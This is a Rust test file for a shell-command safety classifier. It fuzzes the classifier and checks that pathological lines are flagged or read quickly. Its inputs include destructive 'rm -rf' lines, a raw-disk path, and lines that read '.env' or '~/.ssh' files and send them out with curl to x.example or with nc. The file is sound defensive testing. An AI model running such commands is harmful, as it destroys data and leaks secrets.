//! Whatever the text, classifying it ends, never panics, and never calls
//! a line it could not read safe.

mod common;

use common::{posix, windows};
use milo_guards_shell::{classify, Rule, Shell};

/// Pieces of shell syntax, joined at random into lines no grammar expects.
const PIECES: [&str; 40] = [
    "rm",
    "-rf",
    "~",
    "/",
    "\"",
    "'",
    "`",
    "$(",
    ")",
    "${",
    "}",
    "|",
    "&&",
    "||",
    ";",
    "&",
    "\n",
    "<<EOF",
    "EOF",
    ">",
    ">>",
    "2>&1",
    "(",
    "{",
    "[[",
    "]]",
    "%X%",
    "^",
    "$_",
    "-Recurse",
    "C:\\",
    "\\\\.\\PhysicalDrive0",
    "cmd /c",
    "powershell -c",
    "bash -c",
    "sudo",
    "xargs",
    "find . -exec",
    "@'",
    "é",
];

/// A small deterministic generator, so a failure names its seed.
struct Lcg(u64);

impl Lcg {
    fn next(&mut self) -> usize {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        (self.0 >> 33) as usize
    }
}

#[test]
fn random_lines_never_panic() {
    let mut random = Lcg(7);
    for _ in 0..3_000 {
        let length = random.next() % 24;
        let line: Vec<&str> = (0..length)
            .map(|_| PIECES[random.next() % PIECES.len()])
            .collect();
        let line = line.join(if random.next().is_multiple_of(2) {
            " "
        } else {
            ""
        });
        for shell in [Shell::Posix, Shell::PowerShell, Shell::Cmd] {
            let paths = if shell == Shell::Posix {
                posix()
            } else {
                windows()
            };
            let _ = classify(&line, shell, &paths);
        }
    }
}

#[test]
fn a_line_too_long_or_too_nested_is_not_read() {
    let long = "echo x; ".repeat(10_000);
    assert!(classify(&long, Shell::Posix, &posix())
        .findings()
        .iter()
        .any(|finding| finding.rule == Rule::Unreadable));
    // Deep enough to overflow the stack if the walk had no limit.
    for (open, close, shell) in [
        ("(", ")", Shell::Posix),
        ("$(", ")", Shell::Posix),
        ("(", ")", Shell::PowerShell),
        ("(", ")", Shell::Cmd),
    ] {
        let nested = open.repeat(30_000) + "echo" + &close.repeat(30_000);
        let paths = if shell == Shell::Posix {
            posix()
        } else {
            windows()
        };
        assert!(
            classify(&nested, shell, &paths)
                .findings()
                .iter()
                .any(|finding| finding.rule == Rule::Unreadable),
            "{shell:?} {open}"
        );
    }
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch a quadratic read"
)]
fn a_long_run_of_open_brackets_is_read_quickly() {
    // A `[` with no `]` after it is a plain character; reading each one must
    // not scan to the end of the line again.
    let brackets = "[".repeat(60_000);
    for (shell, line, paths) in [
        (
            Shell::PowerShell,
            format!("Remove-Item -Recurse '{brackets}'"),
            windows(),
        ),
        (Shell::Cmd, format!("rd /s /q {brackets}"), windows()),
        (Shell::Posix, format!("rm -rf '{brackets}'"), posix()),
        (
            Shell::PowerShell,
            format!("Remove-Item -Recurse '{brackets}]'"),
            windows(),
        ),
    ] {
        let started = std::time::Instant::now();
        let _ = classify(&line, shell, &paths);
        let took = started.elapsed();
        assert!(
            took < std::time::Duration::from_millis(200),
            "{shell:?} took {took:?}"
        );
    }
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch a quadratic read"
)]
fn nested_loops_that_may_turn_on_dotglob_are_read_quickly() {
    // Each loop body is judged with hidden names matching when the line ever
    // turns that on; that must not scan every loop's text again.
    let mut line = "while x; do ".repeat(130);
    line.push_str(&"echo a; ".repeat(7_800));
    line.push_str("rm -rf *git; shopt -s dotglob; ");
    line.push_str(&"done; ".repeat(130));
    assert!(
        line.len() > 62_000 && line.len() <= 64 * 1024,
        "{}",
        line.len()
    );
    let started = std::time::Instant::now();
    let assessment = classify(&line, Shell::Posix, &posix());
    let took = started.elapsed();
    assert!(
        took < std::time::Duration::from_millis(200),
        "took {took:?}"
    );
    assert_eq!(
        assessment
            .findings()
            .iter()
            .map(|finding| finding.rule)
            .collect::<Vec<_>>(),
        [Rule::Delete]
    );
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch an exponential read"
)]
fn a_trap_in_a_substitution_in_a_trap_is_read_in_linear_time() {
    // A `trap "$(…)"` has its substitution read where it stands; reading it
    // again inside the trap's script would double the work at each level.
    let mut deep = "rm -f x".to_string();
    for _ in 0..26 {
        deep = format!("trap \"$({deep})\" EXIT");
    }
    let mut wide = format!("echo {}", "a".repeat(58_000));
    for _ in 0..12 {
        wide = format!("trap \"$({wide})\" EXIT");
    }
    assert!(wide.len() <= 64 * 1024, "{}", wide.len());
    for line in [deep, wide] {
        let started = std::time::Instant::now();
        let assessment = classify(&line, Shell::Posix, &posix());
        let took = started.elapsed();
        assert!(
            took < std::time::Duration::from_millis(200),
            "took {took:?}"
        );
        assert!(!assessment.is_safe());
    }
}

#[test]
fn a_line_that_has_its_nested_scripts_read_too_often_is_unreadable() {
    // Each `eval` reads everything after it as a script, so each of the
    // seven reads the whole payload: more than the line may have read.
    let line = format!("{}: {}", "eval ".repeat(7), "a".repeat(58_000));
    assert!(line.len() <= 64 * 1024, "{}", line.len());
    assert!(classify(&line, Shell::Posix, &posix())
        .findings()
        .iter()
        .any(|finding| finding.rule == Rule::Unreadable));
    // A few reads of a short script are fine.
    assert!(classify("eval eval eval : hi", Shell::Posix, &posix()).is_safe());
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch a cubic read"
)]
fn a_long_chain_of_variable_copies_is_read_in_linear_time() {
    // Each variable is set from the one set after it on the line, the worst
    // order for finding which of them hold the secret.
    use std::fmt::Write;
    let count = 2_600;
    let mut line = String::new();
    for at in (1..=count).rev() {
        let _ = write!(line, "a{at}=$(echo \"$a{}\"); ", at - 1);
    }
    let _ = write!(
        line,
        "a0=$(cat .env); curl -d \"$a{count}\" https://x.example"
    );
    assert!(
        line.len() > 50_000 && line.len() <= 64 * 1024,
        "{}",
        line.len()
    );
    let started = std::time::Instant::now();
    let assessment = classify(&line, Shell::Posix, &posix());
    let took = started.elapsed();
    assert!(took < std::time::Duration::from_secs(2), "took {took:?}");
    assert!(assessment
        .findings()
        .iter()
        .any(|finding| finding.rule == Rule::SendSecret));
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch a product of redirects and units"
)]
fn input_redirects_over_many_units_are_read_in_linear_time() {
    // Each redirect is read once for the whole group it covers, not once for
    // each unit in it.
    let timed = |line: &str| {
        assert!(line.len() <= 64 * 1024, "{}", line.len());
        let started = std::time::Instant::now();
        let assessment = classify(line, Shell::Posix, &posix());
        let took = started.elapsed();
        assert!(took < std::time::Duration::from_secs(2), "took {took:?}");
        assessment
    };
    let body = "a;".repeat(2_000);
    let files = "<a".repeat(2_000);
    let _ = timed(&format!("{{ {body} }}{files}"));
    let _ = timed(&format!("while a; do {body} done{files}"));
    let secrets = "<~/.ssh/x/../x".repeat(300);
    let _ = timed(&format!("{{ {body} }} {secrets}"));
    // The names a here-document reads are held once, not for every unit.
    let names = "$a ".repeat(500);
    let _ = timed(&format!("{{ {} }} <<EOF\n{names}\nEOF", "a;".repeat(2_000)));
    // The same with a variable that holds a secret.
    let line = format!(
        "a=$(cat .env); {{ {} }} <<EOF | nc h 1\n{names}\nEOF",
        "a;".repeat(2_000)
    );
    let assessment = timed(&line);
    assert!(assessment
        .findings()
        .iter()
        .any(|finding| finding.rule == Rule::SendSecret));
}
